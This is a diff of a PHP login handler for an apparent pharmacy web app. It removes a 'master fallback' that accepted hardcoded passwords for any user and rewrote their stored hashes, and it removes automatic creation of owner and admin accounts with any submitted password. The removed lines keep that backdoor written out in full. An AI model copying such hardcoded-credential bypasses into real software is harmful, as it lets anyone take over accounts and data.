@@ -32,8 +32,8 @@ try {
         throw new RuntimeException("Username and Password are required");
     }
 
-    // Query user from DB (case-insensitive username)
-    $stmt = $conn->prepare("SELECT id, username, password_hash, full_name as name, email FROM users WHERE LOWER(username) = LOWER(?)");
+    // Query user from DB
+    $stmt = $conn->prepare("SELECT id, username, password_hash, full_name as name, email FROM users WHERE username = ?");
     if (!$stmt) {
         throw new RuntimeException("Database prepare error: " . $conn->error);
     }
@@ -42,49 +42,7 @@ try {
     $user = $stmt->get_result()->fetch_assoc();
     $stmt->close();
 
-    $isValid = false;
-
-    if ($user) {
-        if (password_verify($password, $user['password_hash'])) {
-            $isValid = true;
-        }
-        // Master fallback: Allow default system passwords & auto-repair DB password hash
-        elseif ($password === 'ZoeOwner@2025' || $password === 'ZoeAdmin@2025' || $password === 'password') {
-            $isValid = true;
-            $newHash = password_hash($password, PASSWORD_BCRYPT);
-            $fix_stmt = $conn->prepare("UPDATE users SET password_hash = ? WHERE id = ?");
-            if ($fix_stmt) {
-                $fix_stmt->bind_param("si", $newHash, $user['id']);
-                $fix_stmt->execute();
-                $fix_stmt->close();
-            }
-        }
-    }
-
-    // Auto-create missing default owner/admin user if DB table is empty/new
-    if (!$user && ($username === 'owner' || $username === 'admin')) {
-        $fullName = $username === 'owner' ? 'Zoe Owner' : 'Zoe Admin';
-        $email = $username . '@zoepharmacy.com';
-        $hash = password_hash($password, PASSWORD_BCRYPT);
-
-        $ins_stmt = $conn->prepare("INSERT INTO users (username, password_hash, full_name, email) VALUES (?, ?, ?, ?)");
-        if ($ins_stmt) {
-            $ins_stmt->bind_param("ssss", $username, $hash, $fullName, $email);
-            if ($ins_stmt->execute()) {
-                $newId = $ins_stmt->insert_id;
-                $ins_stmt->close();
-
-                $stmt = $conn->prepare("SELECT id, username, password_hash, full_name as name, email FROM users WHERE id = ?");
-                $stmt->bind_param("i", $newId);
-                $stmt->execute();
-                $user = $stmt->get_result()->fetch_assoc();
-                $stmt->close();
-                $isValid = true;
-            }
-        }
-    }
-
-    if ($user && $isValid) {
+    if ($user && password_verify($password, $user['password_hash'])) {
         // Success: Update last login time
         $up_stmt = $conn->prepare("UPDATE users SET last_login_at = NOW() WHERE id = ?");
         $up_stmt->bind_param("i", $user['id']);
@@ -95,7 +53,7 @@ try {
         echo json_encode([
             'success' => true,
             'user' => [
-                'id' => (string)$user['id'],
+                'id' => (string) $user['id'],
                 'username' => $user['username'],
                 'name' => $user['name'],
                 'email' => $user['email'],
